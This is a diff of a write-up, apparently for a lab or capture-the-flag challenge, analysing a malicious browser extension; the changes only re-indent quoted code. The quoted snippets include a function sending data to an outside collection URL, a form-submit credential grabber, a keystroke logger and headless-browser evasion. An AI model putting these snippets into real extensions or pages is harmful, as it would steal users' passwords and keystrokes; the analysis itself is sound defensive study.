@@ -34,7 +34,7 @@ Your task is to perform a thorough analysis of this extension identify its malic
 We have several files to check, the ones I looked at first where the ones that could potentially have some sort of obscure target URLs.
 Looking at app.js I found this:
 ```javascript
-    const targets = [_0xabc1('d3d3LmZhY2Vib29rLmNvbQ==')];
+const targets = [_0xabc1('d3d3LmZhY2Vib29rLmNvbQ==')];
 ```
 When I saw the "==" at the end of the string I thought about one particular encoding, I used CyberChef and the result was `www.facebook.com`, so we just found the encoding method.
 
@@ -60,11 +60,11 @@ I found it in the previous question by decoding the Base64 string.
 
 Here I was looking for for something related to sending data, it was not hard since the functions have a good naming. We can take a look at the function `sendToServer` and we will find the element used to send data.
 ```javascript
-    function sendToServer(encryptedData) {
-        var img = new Image();
-        img.src = 'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);
-        document.body.appendChild(img);
-    }
+function sendToServer(encryptedData) {
+  var img = new Image();
+  img.src = 'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);
+  document.body.appendChild(img);
+}
 ```
 
 <details>
@@ -79,10 +79,10 @@ Here I was looking for for something related to sending data, it was not hard si
 Now we should check the other `.js` files, because `app.js` doesn't seem to have anything related. Checking `loader.js` we can see again a little help from the developer.
 
 ```javascript
-    if (navigator.plugins.length === 0 || /HeadlessChrome/.test(navigator.userAgent)) {
-        alert("Virtual environment detected. Extension will disable itself.");
-        chrome.runtime.onMessage.addListener(() => { return false; });
-    }
+if (navigator.plugins.length === 0 || /HeadlessChrome/.test(navigator.userAgent)) {
+  alert("Virtual environment detected. Extension will disable itself.");
+  chrome.runtime.onMessage.addListener(() => { return false; });
+}
 ```
 This alert explains that it will disable itself, if the condition is fullfilled. The condition that has to be fullfilled is one or the other separated by the or "||", in this case the question asks for the first condition.
 
@@ -97,11 +97,12 @@ This alert explains that it will disable itself, if the condition is fullfilled.
 
 I had to comeback to `app.js`, now looking for an event and a form. And I found this part:
 ```javascript
-    document.addEventListener('submit', function(event) {
-        let form = event.target;
-        let formData = new FormData(form);
-        let username = formData.get('username') || formData.get('email');
-        let password = formData.get('password');
+document.addEventListener('submit', function(event) {
+  let form = event.target;
+  let formData = new FormData(form);
+  let username = formData.get('username') || formData.get('email');
+  let password = formData.get('password');
+  ...
 ```
 The event that the extension captures is `submit` to track the user input through the form, that has two inputs, an user (or email) and a password, and if both are filled it will call the function `exfiltrateCredentials` with both parameters.
 
@@ -116,10 +117,10 @@ The event that the extension captures is `submit` to track the user input throug
 
 In the same file `app.js` just after the section of the code I previously mentioned we can see another event capture:
 ```javascript
-    document.addEventListener('keydown', function(event) {
-        var key = event.key;
-        exfiltrateData('keystroke', key);
-    });
+document.addEventListener('keydown', function(event) {
+  var key = event.key;
+  exfiltrateData('keystroke', key);
+});
 ```
 In this case a `keydown` event that calls to the function `exfiltrateData`.
 
@@ -171,14 +172,14 @@ So the encryption algorithm is AES, and also we can see that is using custom key
 
 We have to take a look to another file to get this one, in this case it's interesting to take a look at `manifest.json` in this configuration file we can see a parameter about the `permissions`:
 ```json
-  "permissions": [
-    "tabs",
-    "http://*/*",
-    "https://*/*",
-    "storage",
-    "webRequest",
-    "webRequestBlocking",
-    "cookies"
+"permissions": [
+  "tabs",
+  "http://*/*",
+  "https://*/*",
+  "storage",
+  "webRequest",
+  "webRequestBlocking",
+  "cookies"
   ]
 ```
 
